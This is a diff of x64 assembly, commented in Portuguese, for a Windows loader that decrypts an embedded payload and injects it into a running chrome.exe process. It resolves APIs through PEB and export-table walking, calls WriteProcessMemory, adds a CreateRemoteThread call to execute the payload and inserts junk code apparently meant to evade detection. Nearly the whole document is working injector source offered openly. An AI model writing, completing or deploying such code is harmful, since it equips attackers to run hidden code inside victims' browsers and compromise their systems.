@@ -10,6 +10,7 @@ section .data
         addressAlocado times 8 dq 0
         addressAlocadoEx times 8 dq 0
         handle times 8 dq 0
+        entrypointTarget times 8 dq 0
 section .text
 
 WinMain:
@@ -45,8 +46,7 @@ WinMain:
         call Encrypt
         call CriaArquivoEncriptado 
         call PrepareInject
-
-         
+ 
         Encrypt:
                 xor rcx,rcx
                 xor rax,rax
@@ -482,7 +482,6 @@ WinMain:
                 mov r8, rbx;              # Copia o endereco base do Kernel32 para o registrador R8
                 ret
         
-
         ;locate_ntdll
         Locate_ntdll:        
                 xor rcx, rcx;             # Zera RCX
@@ -532,11 +531,12 @@ WinMain:
                 add rsp, 0x30
                 mov rbx,rax
                 add rsp, 0x10
-                mov [addressAlocado], rax
-
+                mov [addressAlocado], rbx
+                
                 xor rcx,rcx
                 xor rdx,rdx
                 mov rsi, r13
+                        
                 LoopDecrypt:
                         mov rdx, [rsi]
                         sub dl, 0x95
@@ -637,9 +637,9 @@ WinMain:
                 mov r10,rax
                 add rsp, 0x30
 
-                mov rax, ".exe"
+                mov rax, "xe"
                 push rax
-                mov rax, "explorer"
+                mov rax, "chrome.e"
                 push rax
                 mov [rbp+0xF0], rsp
          
@@ -739,99 +739,38 @@ WinMain:
                                 mov r11,rax
                                 mov [addressAlocadoEx], rax
                                 
-                        GetModuleHandleW:
-                                ;Lookup GetModuleHandleW
-                                mov rax, "eHandleW"
-                                push rax
-                                mov rax, "GetModul"
-                                push rax
-                                lea rdx, [rsp]
-                                mov rcx, r15
-                                sub rsp, 0x30
-                                call r14
-                                mov r12, rax
-                                add rsp, 0x30
-
-                                ;call GetModuleHandleW
-                                xor ecx,ecx
-                                sub rsp, 0x30
-                                call r12
-                                mov rbp, rax
-                                add rsp, 0x30
-                                mov r13, rax
-
-                                mov rax, [addressAlocado]
-                                movsxd r14, dword [rax+0x3c]
-                                add r14,rax
-            
-                                ;Calcula Delta
-                                xor r15d,r15d
-                                xor rcx,rcx
-                                mov r12,rdi
-                                mov r15,rdi
-                                add r15, 0x3c
-                                xor rdi,rdi
-                                mov rdi, [r15]
-                                shl rdi, 0xB0
-                                shr rdi, 0xB0
-                                mov r15, r12
-                                add r15, rdi
-                                mov r10d, dword [r14+0xB0]
+                                push rbp
+                                mov rbp, rsp
+                                sub rsp, 0xA0
                                 
+                                ;Código lixo
+                                mov rax, [addressAlocadoEx]
+                                xor r15d,r15d
+                                xor r10,r10
+                                xor r14,r14
                                 xor rbx,rbx
                                 mov rbx, [addressAlocado]
-                                mov rsi, rbx
-                                add r10, rsi
+                                mov r14, rbx
+                                add r14, 0x3c
                                 xor rbx,rbx
-                                mov rbx, [addressAlocadoEx]
-                                mov rdi, rbx
-                                sub rdi, R14
-                                mov r11, rbx
-                                mov ecx, dword [r10+0x04]
-                                mov rax, rbx
-                                test ecx,ecx
+                                mov rbx, [r14]
+                                shl rbx, 0xB0
+                                shr rbx, 0xB0
+                                mov r14, [addressAlocado]
+                                add r14, rbx
+                                mov r10d, [r14+0xB0]
+                                
+                                mov rsi, [addressAlocado]
+                                add r10,rsi
 
-                                je Fim
-                                xor rbx,rbx
-                                mov ebx, 0xFFF
-                                nop
-                        Fim5:
-                                mov r9d,ecx
-                                movzx r8d,r15w
-                                sub r9, 0x08
-                                shr r9, 0x8
-                                shr r9, 0x1
-                                test r9d, r9d
-                                je Fim2
-                                nop
-                                nop
-                        Fim4:
-                                movsx rax, r8w
-                                movzx eax, word [r10+rax*2+8]
-                                test bx,ax
-                                je Fim3
-                                mov edx, dword [r10]
-                                and rax,rbx
-                                lea rcx, qword [rsi+rax] 
-                                add qword [rdx+rcx],rdi
-                        Fim3: 
-                                inc r8w
-                                movsx eax, r8w
-                                cmp eax, r9d
-                                jb Fim4
-                                mov ecx, dword [r10+0x04]
-                        Fim2:   
-                                mov eax,ecx
-                                add r10,rax
-                                mov ecx, dword [r10+0x04]
-                                test ecx,ecx
-                                jne Fim5
-                        Fim: 
-
-                        ;call Locate_kernel32
+                                mov rdi, [addressAlocadoEx]
+                                mov rbx, [addressAlocado]
+                                sub rdi,rbx
+                                mov r11, [addressAlocadoEx]
+                        
                         call GetProcAddres
+                        
                         call LoadLibrary
-
                         ;Load kernelbase.dll
                         mov rax, "se.dll"     
                         push rax
@@ -860,7 +799,11 @@ WinMain:
                                 add rsp, 0x30
 
                                 ;call WriteProcessMemory
-                                mov r9d, [r14+0x50]
+                                xor rbx,rbx
+                               
+                                mov rbx, [TamArqTarget]
+                                mov r9d, ebx
+                                xor r10,r10
                                 mov r8, [addressAlocado]
                                 mov rdx, [addressAlocadoEx]
                                 xor r15,r15
@@ -870,8 +813,36 @@ WinMain:
                                 mov rbp, rax
                                 add rsp, 0x30     
                                
-
                         call Locate_kernel32
+                        CreateRemoteThread:
+                                ;Lookup CreateRemoteThread
+                                mov rax, "ad"
+                                push rax
+                                mov rax, "moteThre"
+                                push rax
+                                mov rax, "CreateRe"
+                                push rax
+                                lea rdx, [rsp]
+                                mov rcx, r8
+                                sub rsp, 0x30
+                                call r14
+                                add rsp, 0x30
+                                mov r12,rax
+
+                                ;call CreateRemoteThread
+                                xor r15,r15
+                                mov [rsp+0x30], r15
+                                xor rbx,rbx
+                                mov rbx,[addressAlocadoEx]
+                                mov r9, rbx
+                                mov dword [rsp+0x28],r15d
+                                mov [rsp+0x20], r15d
+                                xor rbx,rbx
+                                xor r8d,r8d
+                                xor edx,edx
+                                mov rcx, [handle]
+                                call r12
+                        Exit:                             
                         ;lookup ExitProcess
                                 mov rax, "ess"
                                 push rax
@@ -882,8 +853,8 @@ WinMain:
                                 sub rsp, 0x30
                                 call r14
                                 mov r12 ,rax
-
                                 call r12
+                        ret
 
         GetProcAddres:
                 xor r11,r11
@@ -938,4 +909,5 @@ WinMain:
                 mov eax, [r11+4+r13*4]; # Get the function RVA.
                 add rax, r8;            # Add base address to function RVA
                 mov r14, rax;           # GetProcAddress to R14
+        ret
 ret
